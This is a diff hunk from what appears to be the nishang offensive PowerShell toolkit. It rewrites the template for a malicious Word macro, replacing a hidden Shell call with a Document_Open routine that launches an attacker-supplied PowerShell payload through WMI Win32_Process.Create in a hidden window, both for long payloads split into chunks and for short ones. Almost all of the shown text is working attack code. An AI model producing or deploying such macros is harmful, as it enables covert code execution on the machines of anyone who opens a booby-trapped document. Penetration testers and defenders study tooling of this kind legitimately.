@@ -256,39 +256,49 @@ https://github.com/samratashok/nishang
             $FinalPayload = $FinalPayload + "& " + '"' + $Payload.Substring($index*800, $remainingindex) + '"' 
         }
 
-        #Macro Code (inspired from metasploit)
-        
+    #Macro code from here http://enigma0x3.wordpress.com/2014/01/11/using-a-powershell-payload-in-a-client-side-attack/
         $code_one = @"
-    
-
-        Sub Execute
-            Dim payload
-            payload = $FinalPayload
-            Call Shell(payload, vbHide)
-        End Sub
-
         Sub Document_Open()
-            Execute
+        Execute
+
         End Sub
 
+
+             Public Function Execute() As Variant
+                Const HIDDEN_WINDOW = 0
+                strComputer = "."
+                Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+                Set objConfig = objStartup.SpawnInstance_
+                objConfig.ShowWindow = HIDDEN_WINDOW
+                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+                objProcess.Create $FinalPayload, Null, objConfig, intProcessID
+             End Function
 "@
     }
     #If the payload is small in size, there is no need of multiline macro.
     else
     {
-        #Macro Code (inspired from metasploit)
+        
         $code_one = @"
-
-        Sub Execute
-            Dim payload
-            payload = "$Payload"
-            Call Shell(payload, vbHide)
-        End Sub
-
         Sub Document_Open()
-            Execute
+        Execute
+
         End Sub
 
+
+             Public Function Execute() As Variant
+                Const HIDDEN_WINDOW = 0
+                strComputer = "."
+                Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
+         
+                Set objStartup = objWMIService.Get("Win32_ProcessStartup")
+                Set objConfig = objStartup.SpawnInstance_
+                objConfig.ShowWindow = HIDDEN_WINDOW
+                Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
+                objProcess.Create "$Payload", Null, objConfig, intProcessID
+             End Function
 "@
     }
 
